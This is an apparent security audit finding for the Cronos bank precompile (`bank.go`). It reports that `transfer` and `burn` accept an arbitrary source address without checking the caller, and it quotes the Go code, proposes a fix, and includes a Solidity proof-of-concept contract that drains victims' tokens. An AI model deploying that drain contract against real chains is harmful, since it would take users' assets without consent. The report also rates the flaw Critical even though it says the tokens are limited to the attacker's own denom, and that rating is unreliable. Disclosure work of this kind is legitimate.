### Title
Missing Caller Authorization in Bank Precompile `transfer` Method Allows Unauthorized Token Drain - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract.Run` function in the bank precompile accepts an arbitrary `sender` address from ABI-encoded input for the `transfer` method without verifying it equals `contract.Caller()`. Any unprivileged EVM contract can call the precompile and specify any victim address as the sender, draining that victim's `evm/<callerAddress>`-denominated native tokens without consent.

### Finding Description
The bank precompile at address `0x0000000000000000000000000000000000000064` exposes a `transfer(address sender, address recipient, uint256 amount)` method. In `BankContract.Run`, the `TransferMethodName` case unpacks `sender` directly from the ABI input arguments and uses it as the `from` address in a `bankKeeper.SendCoins` call:

```go
sender := args[0].(common.Address)   // taken from attacker-controlled input
...
from := sdk.AccAddress(sender.Bytes())
...
denom := EVMDenom(contract.Caller()) // "evm/<callerContract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no check that `sender == contract.Caller()`. The denom is scoped to `EVMDenom(contract.Caller())` = `"evm/" + callerAddress.Hex()`, so the attacker can only move tokens of their own contract's denom — but that is precisely the denom the attacker's contract controls via the `mint` method (which also has no caller restriction beyond the denom scoping).

The same structural issue exists in the `burn` case: `recipient` (the address whose tokens are burned) is taken from args without verifying it equals `contract.Caller()`. [1](#0-0) 

### Impact Explanation
An attacker deploys a contract at `0xAttacker`. The denom `evm/0xAttacker` is the native-layer representation of that contract's token. The attacker can:

1. Mint `evm/0xAttacker` tokens to victims (e.g., as part of a DeFi protocol, airdrop, or liquidity pool) using the `mint` method — also unrestricted beyond denom scoping.
2. Later call `transfer(victim, attacker, victimBalance)` on the bank precompile from `0xAttacker`, draining the victim's entire `evm/0xAttacker` native balance without any signature or approval from the victim.

This constitutes **unauthorized transfer of precompile-controlled assets** (`evm/<address>` tokens are Cosmos-native tokens managed exclusively by the bank precompile). Impact: **Critical** — unauthorized balance change for precompile-controlled assets by an unprivileged actor. [2](#0-1) 

### Likelihood Explanation
The entry path requires only deploying an EVM contract and sending a standard EVM transaction — no special privileges, keys, or governance access needed. Any user who holds `evm/<attackerContract>` tokens (received through any means: DeFi interaction, airdrop, DEX trade) is at risk. The precompile is registered and callable by any contract. [3](#0-2) 

### Recommendation
In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the caller")
}
```

Similarly, in the `BurnMethodName` case, enforce that `recipient` (the address being burned from) equals `contract.Caller()`, or redesign the burn interface so the caller can only burn from their own address. [4](#0-3) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Mint evm/<this> tokens to victim (e.g., as part of a DeFi protocol)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Drain victim's evm/<this> tokens without their consent
    function drain(address victim, address attacker) external {
        uint256 balance = /* victim's evm/<this> balance */ 1000;
        // sender = victim, but caller = address(this) — no authorization check
        bank.transfer(victim, attacker, balance);
    }
}
```

1. Deploy `AttackerContract` at `0xAttacker`.
2. Call `seedVictim(victim, 1000)` — victim now holds 1000 `evm/0xAttacker` native tokens.
3. Call `drain(victim, attacker)` — the bank precompile executes `SendCoins(victim → attacker, 1000 evm/0xAttacker)` with no victim authorization.
4. Victim's balance is zero; attacker holds 1000 `evm/0xAttacker` tokens. [5](#0-4)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L66-73)
```go
// NewBankContract creates the precompiled contract to manage native tokens
func NewBankContract(bankKeeper types.BankKeeper, cdc codec.Codec, kvGasConfig storetypes.GasConfig) vm.PrecompiledContract {
	return &BankContract{bankKeeper, cdc, kvGasConfig}
}

func (bc *BankContract) Address() common.Address {
	return bankContractAddress
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
